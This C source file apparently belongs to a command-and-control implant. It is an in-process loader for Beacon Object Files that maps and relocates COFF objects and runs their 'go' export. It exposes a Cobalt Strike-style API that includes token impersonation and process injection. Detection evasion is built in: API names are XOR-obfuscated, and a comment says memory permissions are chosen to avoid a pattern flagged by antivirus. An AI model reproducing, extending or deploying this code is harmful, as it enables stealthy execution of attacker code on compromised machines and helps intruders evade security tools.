/*
 * bof_loader.c - In-process COFF (BOF) loader
 *
 * Loads a Windows x64 COFF object, relocates it, resolves external symbols
 * (Beacon API + Win32 imports), then calls the "go" export.
 *
 * All section data and IAT slots are placed in a single VirtualAlloc'd block
 * so that every REL32 relocation is guaranteed to fit in an int32_t.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <setjmp.h>

#include "bof_loader.h"
#include "beacon_api.h"
#include "protocol.h"
#include "beacon_syms_enc.h"   /* XOR-obfuscated Beacon API name table */

/* -----------------------------------------------------------------------
 * Windows VEH-based exception recovery for the BOF execution window.
 *
 * __try/__except is an MSVC extension not available in MinGW C mode.
 * Instead: register a high-priority VEH around go_fn(); longjmp out on
 * any Windows exception (STATUS_ACCESS_VIOLATION, STATUS_ILLEGAL_*,
 * STATUS_INT_DIVIDE_BY_ZERO, etc.).
 * ---------------------------------------------------------------------- */
static jmp_buf          g_bof_recover;
static volatile DWORD   g_bof_exc_code = 0;
static volatile int     g_bof_active   = 0;  /* 1 while inside go_fn */

static LONG WINAPI bof_veh(EXCEPTION_POINTERS *ep)
{
    if (!g_bof_active)
        return EXCEPTION_CONTINUE_SEARCH;  /* not our exception */

    g_bof_exc_code = ep->ExceptionRecord->ExceptionCode;
    g_bof_active   = 0;
    longjmp(g_bof_recover, 1);
    return EXCEPTION_CONTINUE_SEARCH;      /* unreachable */
}

/* -----------------------------------------------------------------------
 * COFF / PE structures
 * ---------------------------------------------------------------------- */
#pragma pack(push, 1)

typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFF_FILE_HEADER;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} COFF_SECTION_HEADER;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
} COFF_RELOCATION;

typedef struct {
    union {
        char    ShortName[8];
        struct {
            uint32_t Zeroes;
            uint32_t Offset;
        } LongName;
    } N;
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
} COFF_SYMBOL;

#pragma pack(pop)

/* AMD64 relocation types */
#define IMAGE_REL_AMD64_ADDR64   0x0001
#define IMAGE_REL_AMD64_ADDR32   0x0002
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#define IMAGE_REL_AMD64_REL32    0x0004
#define IMAGE_REL_AMD64_REL32_1  0x0005
#define IMAGE_REL_AMD64_REL32_2  0x0006
#define IMAGE_REL_AMD64_REL32_3  0x0007
#define IMAGE_REL_AMD64_REL32_4  0x0008
#define IMAGE_REL_AMD64_REL32_5  0x0009

#ifndef IMAGE_SYM_UNDEFINED
#define IMAGE_SYM_UNDEFINED 0
#endif

/* -----------------------------------------------------------------------
 * Beacon API function pointer table (index-aligned with _sym_encs[] in
 * beacon_syms_enc.h — order MUST match gen_sym_table.py NAMES list).
 * Names are NOT stored here; they live XOR-encoded in beacon_syms_enc.h.
 * ---------------------------------------------------------------------- */
static void *const _sym_ptrs[] = {
    (void *)BeaconOutput,
    (void *)BeaconPrintf,
    (void *)BeaconDataParse,
    (void *)BeaconDataExtract,
    (void *)BeaconDataInt,
    (void *)BeaconDataShort,
    (void *)BeaconDataLength,
    (void *)BeaconFormatAlloc,
    (void *)BeaconFormatReset,
    (void *)BeaconFormatFree,
    (void *)BeaconFormatAppend,
    (void *)BeaconFormatPrintf,
    (void *)BeaconFormatToString,
    (void *)BeaconFormatInt,
    (void *)BeaconIsAdmin,
    (void *)BeaconIsAdmin,   /* CS spelling BeaconIsAdmIn → same impl */
    (void *)BeaconUseToken,
    (void *)BeaconRevertToken,
    (void *)BeaconSpawnTemporaryProcess,
    (void *)BeaconInjectProcess,
    (void *)BeaconInjectTemporaryProcess,
    (void *)BeaconCleanupProcess,
    (void *)BeaconAddValue,
    (void *)BeaconGetValue,
    (void *)BeaconRemoveValue,
    (void *)toWideChar,
};

/* Decode-and-compare: returns 1 if XOR-decoded enc matches plain. */
static int sym_name_match(const unsigned char *enc, unsigned char enc_len,
                           const char *plain)
{
    size_t plen = strlen(plain);
    if (plen != (size_t)enc_len) return 0;
    for (unsigned char i = 0; i < enc_len; i++)
        if ((enc[i] ^ SYM_XOR_KEY) != (unsigned char)plain[i]) return 0;
    return 1;
}

/* -----------------------------------------------------------------------
 * get_sym_name
 * ---------------------------------------------------------------------- */
static void get_sym_name(const COFF_SYMBOL *sym,
                          const char *strtab, uint32_t strtab_size,
                          char *buf, size_t buf_len)
{
    if (sym->N.LongName.Zeroes == 0) {
        uint32_t off = sym->N.LongName.Offset;
        if (off < strtab_size) {
            strncpy(buf, strtab + off, buf_len - 1);
            buf[buf_len - 1] = '\0';
        } else {
            buf[0] = '\0';
        }
    } else {
        size_t copy = buf_len - 1 < 8 ? buf_len - 1 : 8;
        memcpy(buf, sym->N.ShortName, copy);
        buf[copy] = '\0';
    }
}

/* -----------------------------------------------------------------------
 * resolve_import
 *
 * Resolves __imp_LIBRARY$Function or __imp_Function symbols.
 * For MSVCRT imports, also searches ucrtbase.dll and tries the leading-
 * underscore variant (_vsnprintf etc.) as a fallback.
 * ---------------------------------------------------------------------- */
static void *resolve_import(const char *sym_name)
{
    const char *name = sym_name;
    if (strncmp(name, "__imp_", 6) == 0) name += 6;

    const char *dollar = strchr(name, '$');
    if (dollar) {
        char dll_name[128];
        char func_name[128];
        size_t dll_len = (size_t)(dollar - name);
        if (dll_len >= sizeof(dll_name)) return NULL;
        memcpy(dll_name, name, dll_len);
        dll_name[dll_len] = '\0';
        strncpy(func_name, dollar + 1, sizeof(func_name) - 1);
        func_name[sizeof(func_name) - 1] = '\0';

        size_t dlen = strlen(dll_name);
        char dll_path[256];
        int has_ext = (dlen > 4 &&
                       (_stricmp(dll_name + dlen - 4, ".dll") == 0 ||
                        _stricmp(dll_name + dlen - 4, ".exe") == 0));
        if (has_ext) {
            strncpy(dll_path, dll_name, sizeof(dll_path) - 1);
            dll_path[sizeof(dll_path) - 1] = '\0';
        } else {
            snprintf(dll_path, sizeof(dll_path), "%s.dll", dll_name);
        }

        HMODULE hmod = GetModuleHandleA(dll_path);
        if (!hmod) hmod = LoadLibraryA(dll_path);

        FARPROC fn = NULL;
        if (hmod) fn = GetProcAddress(hmod, func_name);

        /* For MSVCRT imports: fall back to ucrtbase.dll, then underscore variant */
        if (!fn && (_stricmp(dll_name, "MSVCRT") == 0 ||
                    _stricmp(dll_name, "msvcr140") == 0)) {
            HMODULE ucrt = GetModuleHandleA("ucrtbase.dll");
            if (!ucrt) ucrt = LoadLibraryA("ucrtbase.dll");
            if (ucrt) fn = GetProcAddress(ucrt, func_name);

            if (!fn && hmod) {
                /* try _funcName (MSVC-style underscore prefix) */
                char us_name[256];
                snprintf(us_name, sizeof(us_name), "_%s", func_name);
                fn = GetProcAddress(hmod, us_name);
            }
        }

        return (void *)fn;
    }

    /* No dollar — search common DLLs */
    static const char *common_dlls[] = {
        "kernel32.dll", "ntdll.dll",    "user32.dll",   "advapi32.dll",
        "ws2_32.dll",   "shell32.dll",  "ole32.dll",    "oleaut32.dll",
        "psapi.dll",    "netapi32.dll", "shlwapi.dll",  "ucrtbase.dll",
        "msvcrt.dll",   NULL
    };
    for (int i = 0; common_dlls[i]; i++) {
        HMODULE hmod = GetModuleHandleA(common_dlls[i]);
        if (!hmod) hmod = LoadLibraryA(common_dlls[i]);
        if (!hmod) continue;
        FARPROC fn = GetProcAddress(hmod, name);
        if (fn) return (void *)fn;
    }
    return NULL;
}

/* -----------------------------------------------------------------------
 * align16 - round up to 16-byte boundary
 * ---------------------------------------------------------------------- */
static size_t align16(size_t n) { return (n + 15) & ~(size_t)15; }

/* -----------------------------------------------------------------------
 * bof_execute
 * ---------------------------------------------------------------------- */
uint8_t *bof_execute(const uint8_t *coff_data, size_t coff_len,
                     const uint8_t *args,       size_t args_len,
                     size_t *out_len)
{
    *out_len = 0;
    if (!coff_data || coff_len < sizeof(COFF_FILE_HEADER)) return NULL;

    const COFF_FILE_HEADER *fhdr = (const COFF_FILE_HEADER *)coff_data;
    if (fhdr->Machine != 0x8664) return NULL;

    uint16_t num_sections = fhdr->NumberOfSections;
    uint32_t sym_tbl_off  = fhdr->PointerToSymbolTable;
    uint32_t num_syms     = fhdr->NumberOfSymbols;

    const COFF_SECTION_HEADER *shdrs =
        (const COFF_SECTION_HEADER *)(coff_data + sizeof(COFF_FILE_HEADER)
                                       + fhdr->SizeOfOptionalHeader);

    const COFF_SYMBOL *symtab   = NULL;
    const char        *strtab   = NULL;
    uint32_t           strtab_size = 0;

    if (sym_tbl_off && num_syms) {
        symtab = (const COFF_SYMBOL *)(coff_data + sym_tbl_off);
        uint32_t strtab_off = sym_tbl_off + num_syms * sizeof(COFF_SYMBOL);
        if (strtab_off + 4 <= (uint32_t)coff_len) {
            strtab_size = *(uint32_t *)(coff_data + strtab_off);
            strtab      = (const char *)(coff_data + strtab_off);
        }
    }

    /* ------------------------------------------------------------------ */
    /* Phase 1: calculate layout of the single VirtualAlloc block          */
    /*                                                                      */
    /*   [section0 data][pad][section1 data][pad]...[IAT slots]            */
    /*                                                                      */
    /* Keeping everything in one block guarantees that every REL32          */
    /* displacement (IAT ↔ code) fits in an int32_t.                       */
    /* ------------------------------------------------------------------ */
    size_t *sec_offsets = (size_t *)calloc(num_sections, sizeof(size_t));
    if (!sec_offsets) return NULL;

    size_t block_size = 0;
    for (int i = 0; i < (int)num_sections; i++) {
        uint32_t raw  = shdrs[i].SizeOfRawData;
        uint32_t virt = shdrs[i].VirtualSize;
        size_t   sz   = (raw > virt ? raw : virt);
        if (sz == 0) sz = 1;
        sec_offsets[i] = block_size;
        block_size    += align16(sz);
    }

    /* IAT: one pointer slot per symbol (most will stay NULL/unused) */
    size_t iat_offset = block_size;
    block_size += (size_t)num_syms * sizeof(void *);

    /* ------------------------------------------------------------------ */
    /* Phase 2: allocate the block and map sections                        */
    /* ------------------------------------------------------------------ */
    uint8_t *bof_mem = (uint8_t *)VirtualAlloc(NULL, block_size,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
    if (!bof_mem) { free(sec_offsets); return NULL; }

    uint8_t **section_mem = (uint8_t **)calloc(num_sections, sizeof(uint8_t *));
    if (!section_mem) { VirtualFree(bof_mem, 0, MEM_RELEASE); free(sec_offsets); return NULL; }

    for (int i = 0; i < (int)num_sections; i++) {
        section_mem[i] = bof_mem + sec_offsets[i];

        uint32_t raw_size = shdrs[i].SizeOfRawData;
        if (raw_size > 0 && shdrs[i].PointerToRawData) {
            uint32_t src_off = shdrs[i].PointerToRawData;
            if (src_off + raw_size <= (uint32_t)coff_len)
                memcpy(section_mem[i], coff_data + src_off, raw_size);
        }
        /* remainder already zeroed by VirtualAlloc */
    }

    /* IAT lives at the end of the same block */
    void **iat = (void **)(bof_mem + iat_offset);

    /* ------------------------------------------------------------------ */
    /* Phase 3: resolve symbols                                            */
    /* Reset output buffer here so BeaconPrintf errors during resolution  */
    /* are captured and returned instead of silently discarded.           */
    /* ------------------------------------------------------------------ */
    if (g_bof_output) {
        HeapFree(GetProcessHeap(), 0, g_bof_output);
        g_bof_output = NULL;
    }
    g_bof_output_len = 0;
    g_bof_output_cap = 0;

    void **sym_addrs = (void **)calloc(num_syms, sizeof(void *));
    if (!sym_addrs) goto cleanup;

    char sym_name[512];

    for (uint32_t si = 0; si < num_syms; si++) {
        const COFF_SYMBOL *sym = symtab + si;
        get_sym_name(sym, strtab, strtab_size, sym_name, sizeof(sym_name));

        if (sym->SectionNumber > 0 &&
            sym->SectionNumber <= (int16_t)num_sections)
        {
            int sidx = sym->SectionNumber - 1;
            sym_addrs[si] = (void *)(section_mem[sidx] + sym->Value);
        }
        else if (sym->SectionNumber == IMAGE_SYM_UNDEFINED && sym_name[0])
        {
            void *resolved = NULL;
            const char *lookup = sym_name;
            int is_imp = (strncmp(sym_name, "__imp_", 6) == 0);
            if (is_imp) lookup = sym_name + 6;

            /* 1. Beacon API table (names XOR-encoded; decoded inline) */
            for (int bi = 0; _sym_encs[bi].enc; bi++) {
                if (sym_name_match(_sym_encs[bi].enc, _sym_encs[bi].len, lookup)) {
                    resolved = _sym_ptrs[bi];
                    break;
                }
            }

            /* 2. Win32 import */
            if (!resolved) resolved = resolve_import(sym_name);

            if (is_imp && resolved) {
                /* Store fn ptr in IAT slot inside the block; expose &slot */
                iat[si]       = resolved;
                sym_addrs[si] = &iat[si];
            } else {
                sym_addrs[si] = resolved;
            }
        }

        si += sym->NumberOfAuxSymbols;
    }

    /* ------------------------------------------------------------------ */
    /* Phase 4: apply relocations                                          */
    /* ------------------------------------------------------------------ */
    for (int i = 0; i < (int)num_sections; i++) {
        if (!shdrs[i].NumberOfRelocations || !shdrs[i].PointerToRelocations) continue;

        const COFF_RELOCATION *relocs =
            (const COFF_RELOCATION *)(coff_data + shdrs[i].PointerToRelocations);

        for (int r = 0; r < (int)shdrs[i].NumberOfRelocations; r++) {
            const COFF_RELOCATION *rel = relocs + r;
            if (rel->SymbolTableIndex >= num_syms) continue;

            uint8_t *patch  = section_mem[i] + rel->VirtualAddress;
            void    *target = sym_addrs[rel->SymbolTableIndex];

            if (!target) {
                get_sym_name(symtab + rel->SymbolTableIndex,
                             strtab, strtab_size, sym_name, sizeof(sym_name));
                BeaconPrintf(CALLBACK_ERROR, "BOF: unresolved: %s\n", sym_name);
                goto cleanup;
            }

            switch (rel->Type) {

            case IMAGE_REL_AMD64_ADDR64: {
                uint64_t val;
                memcpy(&val, patch, 8);
                val += (uint64_t)(uintptr_t)target;
                memcpy(patch, &val, 8);
                break;
            }

            case IMAGE_REL_AMD64_ADDR32:
            case IMAGE_REL_AMD64_ADDR32NB: {
                uint32_t val;
                memcpy(&val, patch, 4);
                val += (uint32_t)(uintptr_t)target;
                memcpy(patch, &val, 4);
                break;
            }

            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                int extra = rel->Type - IMAGE_REL_AMD64_REL32;
                int32_t val;
                memcpy(&val, patch, 4);
                int64_t disp = (int64_t)(uintptr_t)target
                             - (int64_t)(uintptr_t)(patch + 4 + extra)
                             + (int64_t)val;
                val = (int32_t)disp;
                memcpy(patch, &val, 4);
                break;
            }

            default:
                break;
            }
        }
    }

    /* ------------------------------------------------------------------ */
    /* Phase 4.5: flip block RW → RX now that all writes are done         */
    /* Avoids the PAGE_EXECUTE_READWRITE pattern flagged by static AV.    */
    /* ------------------------------------------------------------------ */
    {
        DWORD old_prot;
        VirtualProtect(bof_mem, block_size, PAGE_EXECUTE_READ, &old_prot);
        FlushInstructionCache(GetCurrentProcess(), bof_mem, block_size);
    }

    /* ------------------------------------------------------------------ */
    /* Phase 5: find and call "go"                                         */
    /* (g_bof_output was already reset at the top of Phase 3)             */
    /* ------------------------------------------------------------------ */
    typedef void (*go_fn_t)(char *, int);
    go_fn_t go_fn = NULL;

    for (uint32_t si = 0; si < num_syms; si++) {
        const COFF_SYMBOL *sym = symtab + si;
        get_sym_name(sym, strtab, strtab_size, sym_name, sizeof(sym_name));

        if (strcmp(sym_name, "go") == 0 &&
            sym->SectionNumber > 0 &&
            sym->SectionNumber <= (int16_t)num_sections)
        {
            int sidx = sym->SectionNumber - 1;
            go_fn = (go_fn_t)(void *)(section_mem[sidx] + sym->Value);
            break;
        }
        si += sym->NumberOfAuxSymbols;
    }

    if (!go_fn) {
        BeaconPrintf(CALLBACK_ERROR, "BOF: 'go' symbol not found\n");
        goto cleanup;
    }

    {
        g_bof_active   = 1;
        g_bof_exc_code = 0;
        PVOID veh = AddVectoredExceptionHandler(1, bof_veh);

        if (setjmp(g_bof_recover) == 0) {
            go_fn((char *)args, (int)args_len);
        } else {
            if (g_bof_output) {
                HeapFree(GetProcessHeap(), 0, g_bof_output);
                g_bof_output = NULL;
            }
            g_bof_output_len = 0;
            g_bof_output_cap = 0;
            BeaconPrintf(CALLBACK_ERROR, "BOF crash (0x%08X)\n", g_bof_exc_code);
        }

        g_bof_active = 0;
        RemoveVectoredExceptionHandler(veh);
    }

    /* ------------------------------------------------------------------ */
    /* Phase 6: collect output and clean up                                */
    /* ------------------------------------------------------------------ */
    uint8_t *result = NULL;
    *out_len = 0;

    /* Copy accumulated output to a fresh heap block so it survives the
     * cleanup below.  Returns NULL (→ "bof failed") if nothing was written. */
    if (g_bof_output && g_bof_output_len > 0) {
        result = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, g_bof_output_len);
        if (result) {
            memcpy(result, g_bof_output, g_bof_output_len);
            *out_len = g_bof_output_len;
        }
    }

    if (g_bof_output) {
        HeapFree(GetProcessHeap(), 0, g_bof_output);
    }
    g_bof_output     = NULL;
    g_bof_output_len = 0;
    g_bof_output_cap = 0;

    free(sym_addrs);
    free(section_mem);
    free(sec_offsets);
    VirtualFree(bof_mem, 0, MEM_RELEASE);
    return result;

cleanup: {
    /* Collect any BeaconPrintf error messages accumulated before the failure */
    uint8_t *err_result = NULL;
    if (g_bof_output && g_bof_output_len > 0) {
        err_result = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, g_bof_output_len);
        if (err_result) {
            memcpy(err_result, g_bof_output, g_bof_output_len);
            *out_len = g_bof_output_len;
        }
    }
    if (g_bof_output) { HeapFree(GetProcessHeap(), 0, g_bof_output); }
    g_bof_output = NULL; g_bof_output_len = 0; g_bof_output_cap = 0;
    free(sym_addrs);
    free(section_mem);
    free(sec_offsets);
    VirtualFree(bof_mem, 0, MEM_RELEASE);
    return err_result;
}
}
